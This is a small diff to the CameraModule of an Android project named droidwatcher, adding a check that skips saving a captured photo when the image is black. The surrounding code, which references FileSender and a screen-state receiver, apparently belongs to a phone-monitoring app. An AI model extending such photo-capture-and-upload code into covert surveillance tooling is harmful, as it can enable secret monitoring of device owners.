@@ -31,6 +31,7 @@ import com.droidwatcher.FileSender;
 import com.droidwatcher.FileSender.FileType;
 import com.droidwatcher.SettingsManager;
 import com.droidwatcher.lib.FileUtil;
+import com.droidwatcher.lib.ImageUtil;
 import com.droidwatcher.receivers.ScreenStateReceiver;
 
 @SuppressLint("NewApi")
@@ -207,6 +208,10 @@ public class CameraModule implements PictureCallback {
 	public void onPictureTaken(byte[] data, Camera camera) {
 		try {
 			if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory()) {
+				return;
+			}
+			
+			if (ImageUtil.isBlack(data)) {
 				return;
 			}
 			
